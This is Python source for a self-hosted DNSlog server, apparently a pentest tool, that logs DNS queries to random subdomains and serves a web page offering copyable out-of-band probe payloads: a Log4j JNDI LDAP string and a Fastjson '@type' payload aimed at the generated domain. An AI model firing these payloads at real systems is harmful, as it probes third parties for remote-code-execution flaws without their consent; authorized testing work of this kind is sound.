#coding="utf8"
import asyncio
import random
import argparse
import dns.resolver
import dns.message
import dns.rrset
import urllib.parse
from http.server import BaseHTTPRequestHandler,ThreadingHTTPServer
from datetime import datetime
import logging

# 配置日志
log_format = logging.Formatter("%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger("dns")
logger.setLevel(logging.DEBUG)
logout = logging.StreamHandler()
logfile = logging.FileHandler("dnslog.log")
logout.setFormatter(log_format)
logfile.setFormatter(log_format)
logger.addHandler(logout)
logger.addHandler(logfile)

# 基本配置变量
queue = {}
domain = ""
http_port = 8000
host = ""

# DNS 处理类
class EchoServerProtocol():
    def __init__(self):
        # dns信息记录
        # {分类名：[[dns_name,ip,time],...]}
        self.queue = {}
    
    def connection_made(self, transport):
        self.transport = transport
    def datagram_received(self, data, addr):
        global domain,queue
        rec_query = dns.message.from_wire(data)
        # 构建返回包
        response = dns.message.make_response(rec_query)
        answer = dns.rrset.from_text(
            rec_query.question[0].name,
            5,
            dns.rdataclass.IN, # type: ignore
            dns.rdatatype.A, # type: ignore
            '127.0.0.1'
        )
        # 单域名不影响访问的返回包
        answer_true = dns.rrset.from_text(
            rec_query.question[0].name,
            300,
            dns.rdataclass.IN, # type: ignore
            dns.rdatatype.A, # type: ignore
            host
        )
        # 设置响应报文标志位
        response.flags |= dns.flags.AA # type: ignore
        response.flags |= dns.flags.QR # type: ignore
        logger.info(f"DNS:{rec_query.question[0].name},{addr}")
        if str(rec_query.question[0].name).upper() == f"{domain}.".upper():
            response.answer.append(answer_true)
        else:
            response.answer.append(answer)
        # 获取分类
            recv_domain = str(rec_query.question[0].name)
            try:
                domain_type = rec_query.question[0].name.labels[-4].decode()
                # domain_type = recv_domain.replace(f".{domain}.","").split(".")[1]
                # 将分类信息记录
                now = datetime.now()
                time_now = now.strftime("%H:%M:%S")
                if domain_type not in self.queue:
                    self.queue[domain_type] = [[recv_domain,addr[0],time_now]]
                else:
                    self.queue[domain_type].append([recv_domain,addr[0],time_now])
                # 删除多余记录
                if len(self.queue[domain_type]) >= 20:
                    self.queue[domain_type].pop(0)
                # 同步记录    
                queue = self.queue
            except IndexError:
                pass
            except Exception as e:
                logger.warning(e)
        # 响应记录
        response_data = response.to_wire()
        self.transport.sendto(response_data, addr)
        logger.info(f"返回响应：{rec_query.question[0].name},{response.answer[0].items}")
        
        
# web ui             
class HttpServer(BaseHTTPRequestHandler,EchoServerProtocol):
    server_version = "nishizhu/0.1"
    sys_version = "zhu/3.3"
    # 重载日志输出
    def log_message(self,format,*args):
        logger = logging.getLogger("dns")
        logger.info(format % args)
        
    def do_GET(self):
        global domain,queue
        try:
            self.send_response(200)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            
            parsed_path = urllib.parse.urlparse(self.path)
            query_params = urllib.parse.parse_qs(parsed_path.query)
            c_value = query_params.get("domain", [None])[0]
            if c_value is None:
                # 随机生成子域
                c = ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba0123456789', 3))
                c_domain = f"{random.randint(10, 99)}.{c}.{domain}"
                html_content = self.generate_html(c_domain)
            else:
                dns_data = queue.get(c_value)
                if dns_data is None:
                    dns_data = []
                html_content = str(dns_data[::-1])
            self.wfile.write(html_content.encode('utf-8'))
        except Exception as e:
            logger.debug(e)
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()
            self.wfile.write("500".encode('utf-8'))
            logger.info("发送500")
        
    def generate_html(self, c_value):
        html_template = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>DNSlog</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            text-align: center;
        }}
        .centered-text {{
            margin-top: 20px;
        }}
        .container {{
            display: flex;
            flex-direction: row;
            justify-content: center;
            align-items: center;
            margin-top: 20px;
        }}
        .text {{
            margin-right: 10px;
            }}
        .copy-button {{
            padding: 8px 16px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }}
        table {{
            margin: 20px auto;
            border-collapse: collapse;
        }}
        th, td {{
            padding: 8px;
            text-align: left;
            border-bottom: 1px solid #ddd;
        }}
    </style>
    <script>
        function copyText(content) {{
  var tempInput = document.createElement("textarea");
  tempInput.value = content;
  document.body.appendChild(tempInput);
  tempInput.select();
  document.execCommand("copy");
  document.body.removeChild(tempInput);
  alert("Text copied to clipboard!");
}};

        function loadDNSData() {{
            var c = document.getElementById("centered-text").innerText;
            var parts = c.split('.');
            var subdomain = parts[parts.length - 3];
            var xhr = new XMLHttpRequest();
            xhr.open("GET", "/?domain=" + subdomain, true);
            xhr.onreadystatechange = function () {{
                if (xhr.readyState === 4 && xhr.status === 200) {{
                    res = xhr.responseText;
                    str = res.replace(/'/g, '"');
                    var response = JSON.parse(str)
                    var tableBody = document.getElementById("dns-table-body");
                    tableBody.innerHTML = "";
                    for (var i = 0; i < response.length; i++) {{
                        var dns = response[i][0];
                        var addr = response[i][1];
                        var time = response[i][2];
                        var row = "<tr><td>" + dns + "</td><td>" + addr + "</td><td>" + time + "</td></tr>";
                        tableBody.innerHTML += row;
                    }}
                }}
            }};
            xhr.send();
        }}

        setInterval(loadDNSData, 3000);
    </script>
</head>
<body>
    <div class="centered-text">
    <h1 class="text" id="centered-text">{0}</h1>
    <button class="copy-button" onclick="copyText('{0}')">Copy Text</button>
    <div class="container">
        <p class="text">Log4j: ${{jndi:ldap://{0}/log}}</p>
        <button class="copy-button" onclick="copyText('{{jndi:ldap://{0}/log}}')">Copy</button>
    </div>
    <div class="container">
        <p class="text">Fastjson: {{"@type":"java.net.Inet4Address","val":"{0}"}}</p>
        <button class="copy-button" onclick="copyText('{{&#x22;@type&#x22;:&#x22;ava.net.Inet4Address&#x22;,&#x22;val&#x22;:&#x22;{0}&#x22;}}')">Copy</button>
    </div>
</div>
    <table>
        <thead>
            <tr>
                <th>Domain</th>
                <th>Address</th>
                <th>Time</th>
            </tr>
        </thead>
        <tbody id="dns-table-body">
        </tbody>
    </table>
    <script>
        loadDNSData();
    </script>
</body>
</html>
        """
        return html_template.format(c_value)

#def httpserver():
    
                
async def main():
    logger.info("Starting DNS server")
    # Get a reference to the event loop as we plan to use
    # low-level APIs.
    loop = asyncio.get_running_loop()
    # One protocol instance will be created to serve all
    # client requests.
    transport, protocol = await loop.create_datagram_endpoint(
        lambda: EchoServerProtocol(), # type: ignore
        local_addr=('0.0.0.0', 53))
    # 创建停止事件
    stop_event = asyncio.Event()
    stop_event.set()
    httpserver = ThreadingHTTPServer(('0.0.0.0', http_port), HttpServer)
    # 封装为异步 HTTPServer
    server = loop.run_in_executor(None, httpserver.serve_forever)
    try:
        # 等待服务器任务完成
        logger.info(f"Starting dnslog Web UI at {domain}:{http_port}, use <Ctrl-C> to stop")
        await server
        
    except Exception as e:
        logger.debug(e)  
        transport.close()
        logger.info("服务即将关闭")
        httpserver.shutdown()
        await stop_event.wait()
        asyncio.get_event_loop().stop()
        asyncio.get_running_loop().stop()


if __name__ == '__main__':   
    parser = argparse.ArgumentParser(description='DNSLog')   
    parser.add_argument('--domain', '-dm', help='domain 域名，必要参数', required=True)
    parser.add_argument('--host', '-i', help='单域名NS IP，必要参数', required=True)
    parser.add_argument('--port', '-p', help='网页端口，非必要参数，默认值8000', default=8000)
    args = parser.parse_args()
    try:
        domain = args.domain    
        http_port = args.port
        host = args.host
    except Exception as e:
        logger.debug(e)
        exit()
    asyncio.run(main())